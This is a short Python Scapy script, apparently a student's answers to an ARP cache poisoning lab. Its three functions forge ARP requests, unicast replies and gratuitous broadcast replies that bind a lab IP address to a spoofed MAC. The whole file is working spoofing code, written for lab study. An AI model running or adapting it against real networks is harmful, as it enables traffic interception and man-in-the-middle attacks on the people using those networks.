#!/usr/bin/env python3
# flake8: noqa
from scapy.all import ARP, Ether, sendp

def q1a():
    ether_frame = Ether(dst='ff:ff:ff:ff:ff:ff', src='02:42:0a:09:00:06')
    arp_pkt = ARP(op = 1, pdst='10.9.0.5', psrc='10.9.0.6', hwsrc='02:42:0a:09:00:06')

    pkt = ether_frame/arp_pkt
    pkt.show()
    sendp(pkt)

def q1b():
    ether_frame = Ether(dst='02:42:0a:09:00:05')
    arp_pkt = ARP(op = 2, pdst='10.9.0.5', psrc='10.9.0.6')

    pkt = ether_frame/arp_pkt
    pkt.show()
    sendp(pkt)

def q1c():
    ether_frame = Ether(dst='ff:ff:ff:ff:ff:ff', src='02:42:0a:09:00:69')
    arp_pkt = ARP(op = 2, pdst='10.9.0.6', psrc='10.9.0.6', hwsrc='02:42:0a:09:00:69', hwdst='ff:ff:ff:ff:ff:ff')

    pkt = ether_frame/arp_pkt
    pkt.show()
    sendp(pkt)

def main():
    q1c()

if __name__=='__main__':
    main()